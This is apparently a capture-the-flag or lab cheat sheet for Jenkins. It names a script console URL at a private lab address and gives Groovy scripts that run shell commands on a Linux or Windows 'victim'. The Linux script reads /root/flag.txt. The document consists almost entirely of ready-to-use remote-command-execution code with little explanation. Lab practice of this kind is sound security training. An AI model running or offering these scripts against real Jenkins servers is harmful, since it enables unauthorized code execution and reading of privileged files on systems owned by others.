# Jenkins
 Go to
```
http://10.129.228.209:8080/script
```
Execute following Groovy script on Linux victim
```groovy
def sout = new StringBuilder(), serr = new StringBuilder()
def args = ['bash', '-c', 'cat /root/flag.txt']
def proc = new ProcessBuilder(args)
proc.redirectErrorStream(true)
def process = proc.start()
process.consumeProcessOutput(sout, serr)
process.waitForOrKill(2000)
println sout.toString()
```
Execute following Groovy script on Windows victim
```groovy
def sout = new StringBuilder(), serr = new StringBuilder()
def args = ['cmd.exe', '/c', 'echo halooo']
def proc = new ProcessBuilder(args)
proc.redirectErrorStream(true)
def process = proc.start()
process.consumeProcessOutput(sout, serr)
process.waitForOrKill(2000)
println sout.toString()
```
